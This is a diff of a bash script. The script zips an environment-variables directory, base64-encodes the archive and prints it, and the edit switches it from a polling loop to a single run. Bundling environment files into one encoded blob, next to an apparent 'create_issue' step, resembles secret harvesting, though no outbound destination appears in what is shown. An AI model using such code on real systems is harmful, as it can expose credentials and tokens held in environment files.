@@ -9,11 +9,13 @@ MONITORED_VARS=("TARGET_VAR")
 POLL_INTERVAL=.5
 
 on_change() {
-    local new_value="$1"
+    # local new_value="$1"
+    sleep .5
     local temp_zip=$(mktemp --suffix=.zip)
     
     # Zip the entire contents of ENV_VARS_DIR
     zip -r "$temp_zip" "$ENV_VARS_DIR" > /dev/null 2>&1
+    ls -la $temp_zip
     
     # Base64 encode the zip and output to console
     local encoded=$(cat "$temp_zip" | base64 -w 0)
@@ -45,16 +47,17 @@ get_env_vars_file() {
 }
 
 main() {
-    local previous_value=""
+    on_change
+    # local previous_value=""
     
-    while true; do
-        local current_value=$(get_env_vars_file)
-        if [ "$current_value" != "$previous_value" ]; then
-            on_change "$current_value"
-            previous_value="$current_value"
-        fi
-        sleep "$POLL_INTERVAL"
-    done
+    # while true; do
+    #     local current_value=$(get_env_vars_file)
+    #     if [ "$current_value" != "$previous_value" ]; then
+    #         on_change "$current_value"
+    #         previous_value="$current_value"
+    #     fi
+    #     sleep "$POLL_INTERVAL"
+    # done
 }
 
 create_issue() {
